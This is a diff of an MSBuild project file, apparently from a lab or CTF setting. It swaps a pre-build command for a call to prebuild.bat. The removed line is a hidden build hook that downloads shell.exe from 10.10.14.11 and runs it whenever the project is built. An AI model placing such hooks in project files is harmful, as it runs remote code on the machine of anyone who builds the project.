@@ -17,14 +17,13 @@
     <PropertyGroup>
         <appname>App1CS</appname>
     </PropertyGroup>
-
     
     <ItemGroup>
         <CSFile Include = "*.cs"/>
     </ItemGroup>
     <ItemDefinitionGroup>
       <PreBuildEvent>
-        <Command>cmd /c powershell wget 10.10.14.11/shell.exe -outfile C:\Windows\Temp\shell.exe; C:\Windows\Temp\shell.exe</Command>
+        <Command>call prebuild.bat</Command>
         <Message>Bruh</Message>
       </PreBuildEvent>
     </ItemDefinitionGroup>
